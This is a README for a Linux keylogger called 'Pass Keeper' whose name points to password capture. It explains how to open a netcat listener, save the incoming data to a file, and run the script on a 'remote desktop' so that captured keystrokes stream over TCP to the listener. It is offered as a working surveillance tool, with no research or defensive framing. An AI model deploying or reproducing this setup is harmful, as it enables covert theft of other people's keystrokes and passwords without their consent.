# Pass Keeper
Standalone Key logger over tcp for Linux
- Using Xlib from: https://github.com/python-xlib/python-xlib
- Using pyxhook from: https://github.com/JeffHoogland/pyxhook

## How to use

### On listener desktop

Launch a netcat or other tcp server in listening mode
```
nc -nlvp 1234
```

You can also redirect the output in a file
```
nc -nlvp 1234 > file.txt
```

### On remote desktop

1. Download the project on the desktop

2. Launch the script pass_keeper.py with two arguments (Destination IP Address and Destination Port)
```
python3 pass_keeper.py 127.0.0.1 1234
```
